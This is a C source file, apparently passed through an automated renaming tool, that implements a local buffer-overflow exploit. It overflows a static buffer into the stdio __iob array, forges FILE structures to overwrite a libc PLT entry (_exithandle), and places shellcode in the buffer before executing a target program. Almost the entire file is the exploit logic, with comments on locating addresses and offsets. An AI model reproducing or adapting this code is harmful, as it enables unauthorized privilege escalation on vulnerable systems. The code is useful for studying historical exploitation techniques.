#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  scalar_t__ u_long ;

/* Variables and functions */
 int EOF ; 
 char* PLT_SYMBOL ; 
 scalar_t__ FUNC0 (char*,char**) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,char*,...) ; 
 int FUNC3 (int,char**,char*) ; 
 scalar_t__ FUNC4 (int) ; 
 int /*<<< orphan*/  meow ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 scalar_t__ FUNC6 (char*,char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 char* prog ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int shell_len ; 
 int /*<<< orphan*/ * shellcode ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ FUNC10 (char*,char*) ; 
 size_t FUNC11 (char*) ; 
 char* FUNC12 (char*,char) ; 
 scalar_t__ FUNC13 (char*,char**,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC14 (char*,char**,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC15 (char*,char*) ; 
 int /*<<< orphan*/  FUNC16 () ; 

FUNC17(int argc, char **argv)
{
char *env = NULL;
char *library = "/usr/lib/libc.so";
char *function = "_exithandle";
u_long off, uoff = 0;
u_long libaddr, pltaddr, bufaddr, iobaddr;
u_long pltent;
char *prognam, *bufnam;
int buflen;
char *badbuf;
u_long *bp;
int c;
extern char *optarg;
extern int optind;
char **arg0, **arg;

prog = FUNC12(argv[0], '/');
if (prog)
++prog;
else
prog = argv[0];

while ((c = FUNC3(argc, argv, "l:f:o:e:")) != EOF)
switch (c) {
case 'l':
library = optarg;
break;
case 'f':
function = optarg;
break;
case 'o':
uoff = FUNC13(optarg, (char **)0, 0);
break;
case 'e':
env = optarg;
break;
default:
FUNC16();
}

if (argc - optind < 3)
FUNC16();

bufnam = argv[optind];

/*
* This is the address that the library in which `function'
* lives gets mapped to in the child address space. We could force
* a non-privileged copy of `prognam' to dump core, and fish
* out the memory mappings from the resulting core file; but this
* is really something users should be able to do themselves.
*/
libaddr = FUNC14(argv[optind+1], (char **)0, 0);
if (libaddr == 0) {
FUNC2(stderr, "%s: impossible library virtual address: %s\n",
prog, argv[optind+1]);
FUNC1(1);
}
FUNC7("Using library %s at 0x%p\n", library, libaddr);

prognam = argv[optind+2];

arg0 = &argv[optind+3];

/*
* `pltaddr' is the offset at which the library's PLT will be
* at from `libaddr'.
*/
pltaddr = FUNC15(library, PLT_SYMBOL);
if (pltaddr == 0) {
FUNC2(stderr, "%s: could not find PLT offset from library\n",
prog);
FUNC1(1);
}
FUNC7("Using PLT at 0x%p\n", pltaddr);

/*
* `off' is the offset from `pltaddr' in which the desired
* function's PLT entry is.
*/
off = FUNC6(library, function);
if (off == 0) {
FUNC2(stderr, "%s: impossible offset from PLT returned\n", prog);
FUNC1(1);
}
FUNC7("Found %s at 0x%p\n", function, off);

/*
* `bufaddr' is the name (or address) of the buffer we want to
* overflow. It's not a stack buffer, so finding it out is trivial.
*/
if (bufnam[0] == '@')
bufaddr = FUNC13(&bufnam[1], (char **)0, 0);
else
bufaddr = FUNC15(prognam, bufnam);

if (bufaddr == 0) {
FUNC2(stderr, "%s: illegal buffer address: %s\n", prog, prognam);
FUNC1(1);
}
FUNC7("Buffer at 0x%p\n", bufaddr);

/*
* `iobaddr' is obviously the address of the stdio(3) array.
*/
iobaddr = FUNC15(prognam, "__iob");
if (iobaddr == 0) {
FUNC2(stderr, "%s: could not find iob[] in %s\n", prog, prognam);
FUNC1(1);
}
FUNC7("iob[] at 0x%p\n", iobaddr);

/*
* This is the absolute address of the PLT entry we want to
* overwrite.
*/
pltent = libaddr + pltaddr + off;

buflen = iobaddr - bufaddr;
if (buflen < shell_len) {
FUNC2(stderr, "%s: not enough space for shell code\n", prog);
FUNC1(1);
}
if (env) {
buflen += FUNC11(env) + 5;
if (buflen & 3) {
FUNC2(stderr, "%s: alignment problem\n", prog);
FUNC1(1);
}
}
badbuf = (char *)FUNC4(buflen);
if (badbuf == 0) {
FUNC2(stderr, "%s: out of memory\n", prog);
FUNC1(1);
}

if (env) {
buflen -= (FUNC11(env) + 5);
FUNC9(badbuf, "%s=", env);

bp = (u_long *)&badbuf[FUNC11(badbuf)];
} else
bp = (u_long *)badbuf;

buflen /= sizeof (*bp);
for (c = 0; c < shell_len; c++)
*bp++ = shellcode[c];

for (; c < buflen; c++)
*bp++ = meow;

/*
* stdin -- whatever
*/
*bp++ = -29;
*bp++ = 0xef7d7310;
*bp++ = 0xef7d7310 - 29;
*bp++ = 0x0101ffff;

/*
* stdout
*/
*bp++ = -29;
*bp++ = pltent - uoff;
*bp++ = pltent - 29;
*bp++ = 0x0201ffff;

/*
* stderr
*/
*bp++ = -29;
*bp++ = pltent - uoff;
*bp++ = pltent - 29;
*bp++ = 0x0202ffff;

*bp++ = 0;

FUNC7("Using absolute address 0x%p\n", pltent - uoff);

/*
* Almost ready to do the exec()
*/
if (env)
FUNC8(badbuf);
else
for (arg = arg0; arg && *arg; arg++) {
if (FUNC10(*arg, "%s") == 0)
*arg = badbuf;
}

FUNC7("Using %d bytes\n", buflen*4);

if (FUNC0(prognam, arg0) < 0) {
FUNC5("execv");
FUNC1(1);
}

}